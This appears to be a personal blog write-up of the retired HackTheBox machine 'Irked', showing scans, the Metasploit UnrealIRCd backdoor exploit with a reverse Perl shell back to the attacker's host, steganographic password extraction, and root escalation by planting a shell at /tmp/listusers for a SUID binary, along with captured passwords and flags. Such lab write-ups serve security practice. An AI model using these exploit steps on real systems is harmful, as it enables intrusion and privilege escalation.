<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>crazyeights225</title>
   
    <link rel="stylesheet" href="../assets/bulma.min.css">
    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script>
    <style>
      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
    </style>
  </head>
  <body>
    <div id="app" class="mt-2">
        <nav class="navbar container" role="navigation" aria-label="main navigation">
            <div class="navbar-brand">
              <a class="navbar-item" href="/">
                <img src="../assets/logo.png">
              </a>
              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
              </a>
            </div>
            <div id="navbar" class="navbar-menu">
              <div class="navbar-start">
                    <a href="../index.html" class="navbar-item">Posts</a>
                    <a href="../projects.html" class="navbar-item">Projects</a>
              </div>
            </div>
          </nav>
    </div>
    <div class="hero-body mt-2" style="background-color: #285aff;">
        <div class="container has-text-centered">
            <h1 class="title" style="color: #f1f1f1;">
                HacktheBox: Irked
            </h1>
            <h2 class="subtitle" style="color: #f1f1f1;">
                Jan 1, 2021
            </h2>
        </div>
    </div>
</section>
<section class="container mt-2">
<div class="content column is-10">
    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
        <ul>
          <li><a href="../index.html">Posts</a></li>
          <li><a href="../sec.html">CTFs and Vulnerable VMs</a></li>
          <li class="is-active"><a href="#" aria-current="page">Irked</a></li>
        </ul>
      </nav>
<p>Doing some retired machines for extra practice.<br>
I tried this one two years and got stuck. This time I got it.</p>

<h6>IP: 10.10.10.117</h6>
<h3>Scanning:</h3>
<p>Finding running services on common ports:</p>
<pre><code><span>crazyeights@es-base:~$ sudo nmap -sS 10.10.10.117
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-01 16:49 EST
Nmap scan report for 10.10.10.117
Host is up (0.040s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind
</span></code></pre>
<h4>More Thorough Scanning:</h4>
<p>More thorough scanning, checking all ports:</p>
<pre><code><span>crazyeights@es-base:~$ sudo nmap -sV -p- 10.10.10.117
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-01 16:58 EST
Nmap scan report for 10.10.10.117
Host is up (0.043s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
34547/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
</span></code></pre>
<p>Add the folllowing line to /etc/hosts:</p>
<pre><code><span>10.10.10.117	irked.htb
</span></code></pre>
<h3>Web:</h3>
<p>Index Page:</p>
<img src="images/irked1.png">
<ul>
<li>Enumerated the server, and found nothing.</li>
<li>Downloaded the irked image, searched it for hidden text/files</li>
<li>Looks liked there is something in it, but gave up.</li>
</ul>
<h3>IRC:</h3>
<ul>
<li>Connect to the IRC service with somesort of client, you will get a banner with the version</li>
<li>which is of course: 3.2.8.1 (you could probably just guess this as well)</li>
<li>There is a popular vulnerability in that version, with msf:</li>
</ul>
<pre><code><span>   13  exploit/unix/irc/unreal_ircd_3281_backdoor        2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution
</span></code></pre>
<ul>
<li>set RHOSTS to 10.10.10.117</li>
<li>set RPORT to 6697</li>
</ul>
<h3>Set the payload:</h3>
<pre><code><span>msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set payload cmd/unix/reverse_perl
payload =&gt; cmd/unix/reverse_perl
msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set LHOST 10.10.14.3
LHOST =&gt; 10.10.14.3
msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.10.117     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
   RPORT   6697             yes       The target port (TCP)


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.3       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

</span></code></pre>
<h5>Run the exploit:</h5>
<pre><code><span>msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; exploit

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697...
    :irked.htb NOTICE AUTH :*** Looking up your hostname...
[*] 10.10.10.117:6697 - Sending backdoor command...
[*] Command shell session 1 opened (10.10.14.3:4444 -&gt; 10.10.10.117:50228) at 2021-01-01 17:19:06 -0500

</span></code></pre>
<h3>User:</h3>
<h5>Spawn an interactive shell:</h5>
<pre><code><span>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
ircd@irked:~/Unreal3.2$ 

</span></code></pre>
<h6>When enumerating we find the user djmardov:</h6>
<ul>
<li>Listing the contents of his home folder we find the user flag and the file backup</li>
</ul>
<pre><code><span>ls -aR
.:
.	       .bashrc	Desktop    .gnupg	  Music     .ssh
[SNIP]

./Documents:
.  ..  .backup	user.txt

</span></code></pre>
<ul>
<li>We do not have permissions to read user.txt, but we can read backup:</li>
</ul>
<pre><code><span>ircd@irked:/home/djmardov/Documents$ cat .backup
cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
</span></code></pre>
<ul>
<li>The 'steg' of 'Super elite steg backup pw' suggests that this a password for something involving stego.</li>
<li>Go back to the irked.jpg</li>
</ul>
<h4>Stego:</h4>
<ul>
<li>Extract hidden file from irked.jpg:</li>
</ul>
<pre><code><span>crazyeights@es-base:~/Downloads$ steghide extract -sf irked.jpg 
Enter passphrase: 
wrote extracted data to &quot;pass.txt&quot;.

crazyeights@es-base:~/Downloads$ cat pass.txt 
Kab6h+m+bbp2J:HG
</span></code></pre>
<p>Use the password to login to SSH as djmardov:</p>
<pre><code><span>crazyeights@es-base:~$ ssh djmardov@10.10.10.117
</span></code></pre>
<h5>User Flag:</h5>
<pre><code><span>djmardov@irked:~$ cd Documents/
djmardov@irked:~/Documents$ ls
user.txt
djmardov@irked:~/Documents$ cat user.txt 
4a66a78b12dc0e661a59d3f5c0267a8e
</span></code></pre>
<h3>Root:</h3>
<h5>Find programs user can run with euid root:</h5>
<pre><code><span>djmardov@irked:~/Documents$ find / -perm /4000 2&gt;/dev/null
[SNIP]
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
</span></code></pre>
<ul>
<li>The program viewuser is non-standard, so might be vulnerable</li>
<li>When checking viewuser we see it calls /tmp/listusers which doesn't exist:</li>
</ul>
<pre><code><span>djmardov@irked:~/Documents$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2021-01-01 16:42 (:0)
djmardov pts/1        2021-01-01 17:26 (10.10.14.3)
sh: 1: /tmp/listusers: not found
djmardov@irked:~/Documents$ 
</span></code></pre>
<ul>
<li>We can create a program listusers that would be called with elevated privileges</li>
<li>Insert a shell into the file listusers, and make it executable:</li>
</ul>
<pre><code><span>djmardov@irked:~/Documents$ cd /tmp
djmardov@irked:/tmp$ echo /bin/sh &gt; listusers
djmardov@irked:/tmp$ chmod a+x listusers
</span></code></pre>
<ul>
<li>Run viewuser again:</li>
</ul>
<pre><code><span>djmardov@irked:/tmp$ /usr/bin/viewuser 
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2021-01-01 16:42 (:0)
djmardov pts/1        2021-01-01 17:26 (10.10.14.3)
# id
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
#
</span></code></pre>
<ul>
<li>It calls our program listusers, which gives us a root shell</li>
</ul>
<h4>Root Flag:</h4>
<pre><code><span># cd /root
# ls
pass.txt  root.txt
# cat pass.txt
Kab6h+m+bbp2J:HG
# cat root.txt
8d8e9e8be64654b6dccc3bff4522daf3
</span></code></pre>
<p>FIN.</p>
</div>
</section>
<footer class="footer">
    <div class="container">
        <div class="columns">
        </div>
    </div>
</footer>
</body>
</html>